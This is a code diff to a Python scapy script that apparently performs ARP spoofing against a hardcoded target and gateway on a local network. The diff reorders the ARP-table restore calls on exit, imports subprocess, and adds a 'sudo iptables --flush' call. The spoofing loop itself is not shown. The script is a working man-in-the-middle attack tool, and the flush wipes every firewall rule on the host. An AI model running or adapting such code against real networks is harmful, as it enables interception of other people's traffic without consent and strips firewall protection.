@@ -1,7 +1,7 @@
 import scapy.all as scapy
 import time
 import sys
-import ipfinder
+import subprocess
 def get_mac(ip):
 	arp_request = scapy.ARP(pdst = ip)
 	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
@@ -20,6 +20,11 @@ def restore(dest_ip,src_ip):
 	packet =  scapy.ARP(op=2,pdst=dest_ip,hwdst=get_mac(dest_ip),psrc=src_ip,hwsrc =get_mac(src_ip))
 	scapy.send(packet,verbose=False,count=4)
 
+
+
+
+
+
 target_ip = "192.168.225.202"
 gate_way_ip= '192.168.225.1'
 
@@ -37,7 +42,9 @@ try:
 			
 
 except KeyboardInterrupt:
-	restore(target_ip,gate_way_ip)
 	restore(gate_way_ip,target_ip)
+	restore(target_ip,gate_way_ip)
+	
+	subprocess.call(['sudo', 'iptables', '--flush'])
 	print("\n[+] Exiting....")
         
